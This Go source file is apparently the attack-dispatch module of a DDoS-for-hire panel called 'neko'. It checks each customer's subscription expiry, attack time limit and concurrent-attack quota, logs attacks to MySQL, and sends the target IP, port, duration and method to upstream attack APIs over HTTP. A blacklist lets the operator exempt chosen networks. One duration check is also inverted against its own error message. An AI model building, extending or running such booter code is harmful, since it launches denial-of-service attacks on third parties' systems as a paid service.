package attack

import (
	"errors"
	"fmt"
	"log"
	"neko/json"
	"neko/markup"
	"neko/mysql"
	"neko/sessions"
	"neko/structs"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func Attack(session sessions.Session, Host string, Port string, Time string, Method string) error {
	//If user has access
	if session.User.Expiry < time.Now().Unix() {
		return fmt.Errorf("account inactive")
	}

	//If parsable
	notip := net.ParseIP(Host)
	if notip == nil {
		return errors.New("Could not resolve host")
	}

	//If host is blocked
	if err := Blacklisted(Host); err != nil {
		return err
	}

	//If valid get method
	m := Get(Method)
	if m == nil {
		return fmt.Errorf("invalid method (somehow)")
	}

	//If port is interger within range
	p, err := strconv.Atoi(Port)
	if err != nil || p > 65535 || p < 1 {
		return fmt.Errorf("invaild target port")
	}

	//if time is interger
	t, err := strconv.Atoi(Time)
	if err != nil || t < 1 {
		return fmt.Errorf("invalid attack duration")
	}

	//If time is larger than allowed time
	if m.Time != nil && t < *m.Time {
		return fmt.Errorf("time is above allowed limit %d", *m.Time)
	}
	if session.User.Timelimit < t {
		return fmt.Errorf("time is above allowed limit %d", session.User.Timelimit)
	}

	//If concurrents met
	if len(mysql.UserAttacks(session.User.Username)) >= session.User.Concurrent {
		return fmt.Errorf("maximum concurrent attacks %d reached", session.User.Concurrent)
	}
	i := markup.Index{
		"host":   Host,
		"port":   Port,
		"time":   Time,
		"Method": Method,
	}
	if err := mysql.Attack(session.User.Username, Host, Time, Method); err != nil {
		return errors.New("database error")
	}

	//Lauch Requests/Attacks
	for _, a := range m.Apis {
		go func() {
			_, err := http.Get(i.Varibles(a))
			if err != nil {
				log.Printf("[API] Error: \"%s\"", err.Error())
			}
		}()
	}

	return nil
}

func Get(method string) *structs.Method {
	for _, m := range json.Methods {
		if strings.EqualFold(method, m.Name) {
			return &m
		}
	}
	return nil
}

func Blacklisted(ip string) error {
	var none = "none"
	for _, y := range json.Blacklist {
		if y.Reason == nil {
			y.Reason = &none
		}
		if y.Prefix != nil && y.Octal != nil {
			A := *y.Prefix + "/" + strconv.Itoa(*y.Octal)

			_, ipnetA, err := net.ParseCIDR(A)
			if err != nil {
				return fmt.Errorf("Blacklisted: \"%s\"", *y.Reason)
			}
			ipB := net.ParseIP(ip)

			if ipnetA.Contains(ipB) {
				return fmt.Errorf("Blacklisted: \"%s\"", *y.Reason)
			}
		}
	}
	return nil

}

func List() []string {
	var o []string
	for _, s := range json.Methods {
		o = append(o, s.Name)
	}
	return o
}
